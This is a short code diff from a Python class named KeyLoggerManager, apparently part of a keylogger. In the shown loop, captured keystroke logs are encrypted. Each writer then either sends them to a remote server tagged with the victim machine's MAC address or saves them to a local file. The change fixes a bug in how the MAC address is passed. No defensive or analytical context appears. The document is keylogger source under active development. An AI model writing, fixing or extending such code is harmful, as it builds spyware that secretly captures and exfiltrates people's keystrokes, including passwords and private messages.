@@ -43,7 +43,7 @@ class KeyLoggerManager:
                 logger_encrypt = self.encryptor.encrypt(get_logger, self.encryption_key)  # Encrypt
                 for writer in self.writers:
                     if isinstance(writer, NetworkWriter):
-                        writer.send_data(logger_encrypt, self.mac_address())  # Send to server
+                        writer.send_data(logger_encrypt, self.mac_address)  # Send to server
                     elif isinstance(writer, FileWriter):
                         writer.send_data(logger_encrypt, 'Key logger.txt')  # Save to file
 
